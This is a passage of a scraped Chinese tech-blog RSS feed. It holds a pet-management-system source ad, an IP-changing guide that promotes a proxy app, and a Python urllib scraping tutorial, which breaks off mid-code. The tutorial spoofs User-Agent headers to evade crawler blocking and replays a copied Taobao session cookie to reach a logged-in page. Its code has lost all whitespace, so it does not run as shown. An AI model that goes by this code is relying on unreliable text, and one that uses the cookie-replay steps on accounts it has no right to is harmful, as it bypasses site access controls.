我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:50 +0000</pubDate>
    </item>
    <item>
      <title>基于Springboot+Vue的宠物管理系统（含源码数据库）</title>
      <link>https://www.ppmy.cn/news/1540347.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维基于Springboot+Vue的宠物管理系统（含源码数据库）news/2025/10/31 17:52:49/1.开发环境开发系统:Windows10/11架构模式:MVC/前后端分离JDK版本: Java JDK1.8开发工具:IDEA数据库版本: mysql5.7或8.0数据库可视化工具: navicat服务器: SpringBoot自带 apache tomcat主要技术:Java,Springboot,mybatis,mysql,vue2.视频演示地址3.功能这个系统包含三个角色：管理员、用户和医生。管理员可以管理系统的轮播图、宠物资讯、管理员和用户信息、医生信息、预约信息、商品信息、流浪动物信息、病历档案以及订单管理。用户可以查看预约信息、病历档案和领养信息，并管理购物车、地址、订单、论坛交流和个人收藏。医生则可以查看和登记病历档案，管理预约信息以及进行在线交流。每个角色根据其职责拥有不同的功能权限。4.图片展示5.源码获取点击直达源码获取：源码获取传送门http://www.ppmy.cn/news/1540347.html相关文章如何修改网络ip地址：一步步指南‌在当今这个数字化时代&amp;#xff0c;网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务&amp;#xff0c;稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而&amp;#xff0c;出于隐私保护、绕过地理限制或测试网络环境等需要&amp;…阅读更多...Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:49 +0000</pubDate>
    </item>
    <item>
      <title>如何修改网络ip地址：一步步指南‌</title>
      <link>https://www.ppmy.cn/news/1540346.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维如何修改网络ip地址：一步步指南‌news/2025/10/31 17:52:48/在当今这个数字化时代，网络已成为我们日常生活与工作中不可或缺的一部分。无论是浏览网页、在线办公还是享受流媒体服务，稳定的网络连接和适当的IP地址管理都是确保良好体验的关键。然而，出于隐私保护、绕过地理限制或测试网络环境等需要，修改网络IP地址成为了一项实用技能。本文将详细介绍如何在不同情境下修改网络IP地址。一、理解IP地址基础首先，让我们简要回顾一下IP地址的基础知识。IP地址（Internet Protocol Address）是分配给每台连接到互联网的设备的唯一数字标识，它允许设备在网络上进行通信。IP地址分为IPv4和IPv6两种，目前广泛使用的是IPv4。IPv4地址由四组数字组成，每组数字范围从0到255，用点（.）分隔，如192.168.1.1。二、动态IP地址的自动更换对于大多数家庭用户和部分小型企业，网络连接往往是通过动态IP地址分配实现的。这意味着每次设备连接到互联网时，都会从服务提供商那里获得一个新的IP地址。如果你希望“修改”IP地址（实际上是让系统为你分配一个新的），可以尝试以下几种方法：1、重启路由器：较为简单直接的方法是重启你的路由器。路由器重启后，通常会向ISP请求一个新的IP地址，从而改变你的网络IP。2、断开并重新连接网络：如果你使用的是无线连接，可以尝试断开网络，等待几秒钟后再重新连接。对于有线连接，可以尝试拔掉网线，稍等片刻后再插上。3、联系ISP：虽然不常见，但如果你有特殊需求，可以联系你的互联网服务提供商（ISP），询问是否有提供这样的服务或解决方案。三、静态IP地址的手动设置对于需要稳定IP地址的应用场景，通常会配置静态IP地址。要手动设置静态IP地址，你需要具备对路由器配置的一定了解，并且需要你的ISP支持静态IP服务。具体可参考以下的操作步骤：步骤1、首先，你需要知道路由器的IP地址、用户名和密码，以便登录其管理界面。这些信息通常可以在路由器的用户手册或机身标签上找到。步骤2、登录后，找到网络设置或WAN（广域网）设置的选项。步骤3、在网络设置或WAN设置中，选择静态IP，并根据ISP提供的信息填写新的IP地址、子网掩码、默认网关、DNS服务器等参数。步骤4、配置完成后，记得保存设置并重启路由器以使更改生效。四、使用代理IP服务如果你需要修改IP地址以访问特定地区的内容或增强隐私保护，使用代理IP服务是一个简单有效的解决方案。通过代理服务器提供的IP地址，充当用户与目标服务器之间的中间层，使你的网络流量看起来像是来自代理服务器的位置，从而改变你的IP地址。下面以支持在安卓手机/电脑上使用的虎观代理IP软件为例进行操作：步骤1：下载与安装‌访问虎观代理官网，下载并安装对应版本的软件。步骤2：注册与登录‌打开软件进行注册，并登录账号（实名注册登录可享受免费试用）。步骤3：选择并切换IP在软件内，根据省份、运营商、空闲节点等信息，挑选符合需求的节点，点击“一键更换IP”。步骤4：管理与断开连接‌：如需自动更换IP，可设置定时切换的时间，然后连接动态线路。连接成功后，即已完成IP地址的更换。若不想使用代理，直接断开连接即可。五、注意事项修改网络IP地址时，需要注意以下几点：●备份原有设置‌：在修改前，务必备份原有网络设置，以防数据丢失或配置错误。‌●了解网络环境‌：确保了解当前网络的IP地址范围和可用的IP地址，避免冲突。‌●选择正确的IP类型‌：根据需求选择静态IP或动态IP，并确保设置的IP地址在网络中是唯一的。‌●合法合规操作‌：了解当地法律法规和服务提供商的用户协议，确保操作合法合规。‌结束语：通过上述方法，你可以根据自己的需求和实际情况选择合适的方式来修改网络IP地址。无论是出于隐私保护、绕过地理限制还是其他目的，掌握这些技能都将为你带来更加灵活和安全的网络体验。往期推荐：怎么样改变手机IP地址‌？四种方法，轻松学会用动态IP软件改变IP地址：探索原理与实用指南‌路由器ip地址是什么意思？路由器ip地址哪里看http://www.ppmy.cn/news/1540346.html相关文章Python 爬虫实战与技巧分享--urllibPython 爬虫实战与技巧分享–urllib 
在当今信息时代&amp;#xff0c;数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具&amp;#xff0c;能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例&amp;#xff0c;深入探讨 Python 爬虫的相关知识和关键要点。 
一、…阅读更多...湖南（满意度调研）综合性产业园区如何提升企业和创业者获得感？湖南&amp;#xff08;市场调研&amp;#xff09;源点咨询认为&amp;#xff0c;相对于专业性产业园来说&amp;#xff0c;综合性产业园的园区运营工作的覆盖面及运营成本要高很多&amp;#xff0c;运营回报率的时效性也要慢很多。 
而从产业园区运营管理的双重目标约束是公共利益和经济利益最大化&amp;#…阅读更多...Spring Cloud 解决了哪些问题？大家好&amp;#xff0c;我是锋哥。今天分享关于【Spring Cloud 解决了哪些问题&amp;#xff1f;】面试题&amp;#xff1f;希望对大家有帮助&amp;#xff1b; Spring Cloud 解决了哪些问题&amp;#xff1f; 
1000道 互联网大厂Java工程师 精选面试题-Java资源分享网 
Spring Cloud 是一个为构建分布式…阅读更多...esp32-c3 Supermini 驱动ds3121的问题c3 驱动ds3121 ,始终有问题&amp;#xff0c;但把程序用esp32上&amp;#xff0c;一点问题都没有&amp;#xff0c;难道c3 的i2c库是另外的库&amp;#xff0c; 
下图只读取秒显示的 错误数据&amp;#xff0c;更换了scl频率&amp;#xff0c;针脚&amp;#xff0c;还是错&amp;#xff0c;但换成esp32 输出是正确连续秒…阅读更多...代码随想录算法训练营第十一天 | 150.逆波兰表达式求值 239.滑动窗口最大值 347.前 K 个高频元素LeetCode 150.逆波兰表达式求值&amp;#xff1a; 
文章链接 题目链接&amp;#xff1a;150.逆波兰表达式求值 
思路&amp;#xff1a; 
① 使用栈进行运算&amp;#xff0c;遇到操作数入栈&amp;#xff0c;遇到运算符出栈两个元素后入栈 ② 需要注意的是&amp;#xff1a;所给的算式为string类型&amp;#xff0c…阅读更多...Leetcode 字符串解码该代码的算法思想可以分为以下几个步骤&amp;#xff1a; 
1. 使用栈来处理嵌套结构&amp;#xff1a; 
我们需要处理像 k[encoded_string] 这种格式&amp;#xff0c;其中的 encoded_string 可能是嵌套的&amp;#xff0c;即像 3[a2[c]] 这样的输入。因此&amp;#xff0c;我们可以借助 栈&amp;#xff08;S…阅读更多...QJniObject--Qt中的Java交互类QJniObject 
QJniObject 是 Qt for Android 中用于与 Java 代码进行交互的一个类。它提供了一个方便的接口&amp;#xff0c;使得 C 代码可以调用 Java 方法、访问 Java 对象和处理 Java 数据。以下是 QJniObject 的一些主要用途&amp;#xff1a; 
1. 调用 Java 方法 
QJniObject 允许你…阅读更多...闯关leetcode——125. Valid Palindrome大纲 题目地址内容 解题代码地址 题目 
地址 
https://leetcode.com/problems/valid-palindrome/description/ 
内容 
A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads …阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径Oracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南2025年市场上烙馍机生产厂家推荐：深度解析领先企业与技术创新Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:52:48 +0000</pubDate>
    </item>
    <item>
      <title>Python 爬虫实战与技巧分享--urllib</title>
      <link>https://www.ppmy.cn/news/1540345.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Python 爬虫实战与技巧分享--urllibnews/2025/10/31 17:52:47/Python 爬虫实战与技巧分享–urllib在当今信息时代，数据的价值日益凸显。Python 爬虫作为一种强大的数据获取工具，能够帮助我们从互联网上抓取各种有价值的信息。本文将结合具体代码示例，深入探讨 Python 爬虫的相关知识和关键要点。一、Python 爬虫基础Python 爬虫是一种使用 Python 编程语言编写的程序，它能够自动地在互联网上浏览网页，并提取出有价值的信息。通常，Python 爬虫的工作流程包括以下几个步骤：定义目标 URL：确定要爬取的网页地址。发送请求：模拟浏览器向服务器发送请求，获取网页内容。解析内容：从响应中提取出有价值的信息，可以使用正则表达式、XPath、BeautifulSoup 等库来实现。存储数据：将提取出的信息存储到本地文件、数据库或其他存储介质中。二、Python 爬虫的工作原理Python 爬虫的工作原理主要包括以下几个步骤：定义目标 URL：首先，我们需要确定要爬取的网页地址。这个地址就是我们的目标访问地址，就像我们在浏览器中输入的网址一样。发送请求：接下来，我们需要模拟浏览器向服务器发送请求。这个请求可以是 GET 请求（获取网页内容）或 POST 请求（提交数据）等。获取响应：服务器接收到请求后，会返回一个响应。这个响应包含了网页的内容、状态码等信息。解析内容：我们需要从响应中提取出有价值的信息。这可以通过解析 HTML 页面、使用正则表达式、使用 XPath 或 BeautifulSoup 等库来实现。存储数据：最后，我们可以将提取出的信息存储到本地文件、数据库或其他存储介质中，以便后续分析和使用。三、代码示例详解1、使用urllib获取百度首页源码以下是使用urllib库获取百度首页源码的代码：importurllib.request# （1）定义一个 url-&gt;就是我们的目标访问地址url='http://www.baidu.com'# （2）模拟浏览器向服务器发送请求response=urllib.request.urlopen(url)# （3）获取响应页面中的源码# read 方法返回的是字节形式的二进制数据# 需要解码：将二进制数据转化成字符串--》二进制--&gt;字符串 decode('编码的格式‘)response=response.read().decode('utf-8')# (4)打印print(response)在这个例子中，我们首先导入了urllib.request模块，然后定义了百度首页的 URL。接着，使用urlopen方法发送请求并获取响应对象。最后，通过read方法读取响应内容，并使用decode方法将二进制数据解码成字符串后打印输出。2、urllib的一个类型和六个方法以下代码展示了urllib的一个类型HTTPResponse和六个方法：importurllib.requesturl='http://www.baidu.com'response=urllib.request.urlopen(url)# 一个类型 HTTPResponseprint(type(response))# http.client.HTTPResponse 的类型# 六个方法# 1.read(字节) 按照一个个字节读取（read 里面的数据表示返回多少个字节）print(response.read())# 2.readline() 读取一行print(response.readline())# 3.readlines() 一行一行读取直至读取完毕print(response.readlines())# 4.response.getcode() 返回状态码print(response.getcode())# 200/404/500# 5.response.geturl()print(response.geturl())# 6.获取一个状态信息的响应头print(response.getheaders())通过这个例子，我们可以了解到urllib响应对象的类型和各种方法的用途，如读取内容、获取状态码、URL 和响应头等。3、使用urlretrieve下载文件urllib.request.urlretrieve方法可以用来下载网页、图片和视频等文件：importurllib.request# 下载网页url_page='http://www.baidu.com'urllib.request.urlretrieve(url_page,'baidu.html')# 下载图片url_img="https://www.bing.com/images/search?view=detailV2&amp;itb=0"urllib.request.urlretrieve(url=url_img,filename='baidu.jpg')# 下载视频url_video="https://tv.sohu.com/v/dXMvMzM1OTQxNzk3LzM5OTA4NDE3Ni5zaHRtbA==.html"urllib.request.urlretrieve(url=url_video,filename='baidu.mp4')这个方法非常方便，可以直接将指定 URL 的内容保存到本地文件中。4、设置请求头UA 介绍：UserAgent 中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的服务器能的操作系统及版本、CPU 类型、浏览器及版本、浏览器内核、浏览器渲染引擎、浏览器语言、浏览器插件等。为了避免被网站识别为爬虫而被封禁，我们可以设置请求头来模拟浏览器行为。以下是设置请求头获取百度首页源码的代码：importurllib.requesturl='https://www.baidu.com'headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",}# 因为 urlopen 方法中不能存储字典，所以 headers 不能传递出去，所以要定制请求对象request=urllib.request.Request(url,headers=headers)# 注意顺序和关键字顺序response=urllib.request.urlopen(request)print(response.read().decode('utf-8'))通过设置请求头中的User-Agent，我们可以伪装成浏览器，提高爬虫的稳定性。5、URL 编码与解码在处理中文参数时，需要进行 URL 编码和解码。以下是获取包含中文参数的网页源码的代码：解释importurllib.requestimporturllib.parse# 需求 获取 https://www.baidu.com/s?wd=周杰伦 的网页源码url='https://www.google.com.hk/search?q='headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"}# 将周杰伦三个字替换成 Unicode 编码的形式 依赖于 urllib.parsename=urllib.parse.quote('周杰伦')url=url+name# 模拟向浏览器发送请求request=urllib.request.Request(url,headers=headers)req=urllib.request.urlopen(request)print(req.read().decode('utf-8'))这里使用urllib.parse.quote方法对中文进行编码，确保 URL 的正确性。6、urlencode应用场景urllib.parse.urlencode方法在处理多个参数时非常有用：importurllib.requestimporturllib.parse# urlencode 应用场景：多个参数的时候base_url='https://www.google.com.hk/search?'data={'q':'周杰伦','sex':'男',}url=base_url+urllib.parse.urlencode(data)headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"}# 请求对象的定制request=urllib.request.Request(url,headers=headers)response=urllib.request.urlopen(request)html=response.read().decode('utf-8')print(html)这个方法可以将字典形式的参数编码成 URL 格式。7、POST 请求与 JSON 数据处理以下是使用 POST 请求并处理 JSON 数据的代码：importurllib.requestimporturllib.parseimportjsonurl='https://fanyi.baidu.com/sug'headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"}data={'kw':'spider'}# post 的参数必须要进行编码 并且必须是字节型的数据 使用.encode('utf-8')data=urllib.parse.urlencode(data).encode('utf-8')request=urllib.request.Request(url=url,data=data,headers=headers)response=urllib.request.urlopen(request)html=response.read().decode('utf-8')print(html)print(type(html))# strobj=json.loads(html)# 将 str 转换成 json 对象print(obj)在这个例子中，我们对 POST 请求的参数进行编码，并将响应的 JSON 数据转换为 Python 对象进行处理。8、复杂 POST 请求与 JSON 数据处理以下是一个更复杂的 POST 请求并处理 JSON 数据的示例：importurllib.requestimporturllib.parseimportjsonurl='https://fanyi.baidu.com/v2transapi?from=en&amp;to=zh'data={'from':'en','to':'zh','query':'1ovetrans','type':'realtime','simple_means_flag':'3','sign':'198772.518981','token':'5483bfa652979b41f9c90d91f3de875d','domain':'common'}headers={# 各种请求头信息}# post 的参数必须要进行编码 并且必须是字节型的数据 使用.encode('utf-8')data=urllib.parse.urlencode(data).encode('utf-8')request=urllib.request.Request(url=url,data=data,headers=headers)response=urllib.request.urlopen(request)html=response.read().decode('utf-8')print(json.loads(html))这个例子展示了在处理复杂 POST 请求时，如何设置多个参数和请求头，并解析响应的 JSON 数据。9、基于 Ajax 的 GET 请求与数据保存以下是基于 Ajax 的 GET 请求并将数据保存到本地的代码：importurllib.requestimporturllib.parseimportjson# 基于 Ajax 的 get 请求url='https://movie.douban.com/j/chart/top_list?type=5&amp;interval_id=100%3A90&amp;action=&amp;start=0&amp;limit=20'headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}request=urllib.request.Request(url,headers=headers)response=urllib.request.urlopen(request)html=response.read().decode('utf-8')data=json.loads(html)# print(data)# 下载数据到本地withopen('douban.json','w',encoding='utf-8')asfp:# 使用 json.dumps 将列表转换为字符串json_str=json.dumps(data,ensure_ascii=False,indent=4)fp.write(json_str)print("数据已成功写入到 douban.json 文件中")这个例子演示了如何处理基于 Ajax 的 GET 请求，并将获取的数据保存为 JSON 文件。10、分页爬取数据以下是实现分页爬取数据的代码：importurllib.requestimporturllib.parseimportjsondefcreate_request(page):base_url=('https://movie.douban.com/j/chart/top_list?type=5&amp;interval_id=100%3A90&amp;action=&amp;')data={'start':(page-1)*20,'limit':20,}data=urllib.parse.urlencode(data)url=base_url+data# print(url)headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}request=urllib.request.Request(url,headers=headers)returnrequestdeffetch_page(requests):response=urllib.request.urlopen(requests)data=json.loads(response.read().decode('utf-8'))returndatadefdownload_page(page,data):withopen('douban'+str(page)+'.json','w',encoding='utf-8')asfp:json_str=json.dumps(data,ensure_ascii=False,indent=4)fp.write(json_str)print("目标："+str(page)+'，已经下载完毕！')# 程序入口if__name__=='__main__':start_page=int(input("请输入起始的页码："))end_page=int(input("请输入结束的页码："))forpageinrange(start_page,end_page+1):# 定制每一页的请求对象（url不同）requests=create_request(page)# 获取数据data=fetch_page(requests)# 保存数据download_page(page,data)11、基于 Ajax 的 POST请求与数据保存importurllib.requestimporturllib.parseimportjsondefcreate_request(pageIndex):base_url=('https://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=cname')data={"cname":"成都","pid":"","pageIndex":pageIndex,"pageSize":"10"}data=urllib.parse.urlencode(data).encode("utf-8")headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}request=urllib.request.Request(url=base_url,data=data,headers=headers)returnrequestdeffetch_page(requests):response=urllib.request.urlopen(requests)data=json.loads(response.read().decode('utf-8'))returndatadefdownload_page(page,data):withopen('kfc_page'+str(page)+'.json','w',encoding='utf-8')asfp:json_str=json.dumps(data,ensure_ascii=False,indent=4)fp.write(json_str)print("kfc目标："+str(page)+'，已经下载完毕！')# 程序入口if__name__=='__main__':start_page=int(input("请输入起始的页码："))end_page=int(input("请输入结束的页码："))forpageIndexinrange(start_page,end_page+1):# 定制每一页的请求对象（url不同）requests=create_request(pageIndex)# 获取数据data=fetch_page(requests)# 保存数据download_page(pageIndex,data)这段代码通过发送带有特定参数的请求，获取 KFC 在成都的门店信息，并将数据保存为 JSON 文件。关键要点在于构造合适的请求参数和处理 JSON 格式的响应数据。12、异常处理–HTTPErrorimporturllib.requestimporturllib.parseimporturllib.errorimportjsonurl=('https://blog.csdn.net/2202_76097976/article/details/142544121')# 当主机地址和参数出现问题的时候，就会报出URLError# url = ('https://blog1.csdn.net/2202_76097976/article/details/142544121')headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}try:request=urllib.request.Request(url,headers=headers)response=urllib.request.urlopen(request)html=response.read().decode('utf-8')print(html)excepturllib.error.HTTPErrorase:print("请稍后，系统正在升级。。。")excepturllib.error.URLErrorase:print("主机或参数出现问题，请检查参数。。。")这里展示了如何处理在爬虫过程中可能出现的错误，包括 HTTP 错误和 URL 错误。通过使用try...except语句，可以增强程序的稳定性和可靠性。13、绕过登录获取页面适用的场景：数据采集的时候需要绕过登陆然后进入到某个页面个人信息页面是utf-8 但是还报错了编码错误因为并没有进入到个人信息页面 而是跳转到了登陆页面 那么登陆页面不是utf-8所以报错解释importurllib.requestimporturllib.parseimporturllib.errorimportjsonurl='https://cart.taobao.com/cart.htm'# 淘宝购物车（原定测试的是微博页面）headers={# ':authority': 'h5api.m.taobao.com',# ':method': 'POST',# ':path': '/h5/mtop.trade.query.bag/5.0/?jsv=2.7.2&amp;appKey=12574478&amp;t=1728546606601&amp;preventFallback=true',# ':scheme': 'https','accept':'application/json',# 'accept-encoding': 'gzip, deflate, br, zstd','accept-language':'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7','content-length':'347','content-type':'application/x-www-form-urlencoded',# cookie中携带着你的登陆信息如果有登陆之后的cookie 那么我们就可以携带着cookie进入到任何页面'cookie':'thw=cn; t=23c0c50b61858303b509f3ae5834bbef; hng=CN%7Czh-CN%7CCNY%7C156; _uetvid=89fd15e0500b11ef8886579c5bff040a','origin':'https://cart.taobao.com','priority':'u=1, i',# referer可以拿来防盗链（判断当前路劲是不是上一个链接进来的）（图片防盗链）'referer':'https//cart.taobao.com/','sec-ch-ua':'"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-site','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',}request=urllib.request.Request(url=url,headers=headers)response=urllib.request.urlopen(request)data=response.read().decode('utf-8')withopen("cookie.html","w",encoding="utf-8")asf:f.write(data)这段代码尝试绕过登录进入淘宝购物车页面，通过设置特定的请求头，尤其是携带cookie信息来实现。这展示了在某些情况下，为了获取特定页面的数据，需要模拟登录状态。14、定制请求头在爬取网页时，有时需要定制更高级的请求头来模拟真实的浏览器行为，避免被网站识别为爬虫而被封禁。例如，以下代码展示了如何使用Handler来定制请求头访问百度并获取网页源码：importurllib.requestimporturllib.parseimporturllib.errorimportjsonurl='http://www.baidu.com'headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}request=urllib.request.Request(url,headers=headers)# 获取 handler 对象handler=urllib.request.HTTPHandler()# 获取 opener 对象opener=urllib.request.build_opener(handler)response=opener.open(request)data=response.read().decode('utf-8')print(data)在上述代码中，我们首先定义了一个包含特定user-agent的请求头，然后创建了一个Request对象并传入请求头。接着，通过HTTPHandler和build_opener创建了一个opener对象，最后使用opener.open方法发送请求并获取响应数据。15、使用代理服务器代理的常用功能：突破自身 IP 访问限制，访问国外站点：对于一些因地域限制无法直接访问的国外网站，可以通过代理服务器来实现访问。访问单位或团体内部资源：例如某大学 FTP，使用教育网内地址段免费代理服务器，可以用于对教育网开放的各类 FTP 下载上传以及各类资料查询共享等服务。提高访问速度：代理服务器通常设置一个较大的硬盘缓冲区，当有外界信息通过时，会将其保存到缓冲区中。当其他用户再访问相同的信息时，直接从缓冲区中取出信息传给用户，从而提高访问速度。隐藏真实 IP：上网者可以通过代理服务器隐藏自己的 IP，免受攻击。代码配置代理：创建Request对象。创建ProxyHandler对象，并传入代理服务器的地址信息（以字典形式）。用handler对象创建opener对象。使用opener.open函数发送请求。以下是使用代理服务器访问百度并查询 IP 的代码示例：importurllib.requestimporturllib.parseimporturllib.errorimportjsonurl='http://www.baidu.com/s?wd=ip'headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 